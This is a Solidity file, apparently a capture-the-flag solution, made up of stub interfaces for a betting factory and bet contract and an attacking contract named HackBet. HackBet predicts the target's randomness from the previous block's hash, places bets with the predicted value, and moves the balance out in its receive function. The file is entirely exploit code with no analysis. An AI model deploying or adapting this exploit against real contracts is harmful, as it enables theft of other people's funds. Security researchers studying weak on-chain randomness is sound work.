// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory
{
    function create() public payable {}
    function validate(uint) public payable {}
}

contract Bet
{
    function bet(uint) public payable {}
    function getRandom() internal returns(uint) {}
}

contract HackBet
{
    address target;
    function create(address _factory) public payable
    {
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
    }
    function validate(address _factory, uint token) public payable
    {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }
    function run(address _target, uint seed) public payable
    {
        target = _target;
        Bet instance = Bet(target);
        uint rand = seed ^ uint(blockhash(block.number - 1));
        instance.bet{value: msg.value}(rand);
    }
    receive () external payable 
    {
        Bet instance = Bet(target);
        if(address(instance).balance > 0)
        {
            msg.sender.call{value: address(this).balance}("");   
        }
    }
}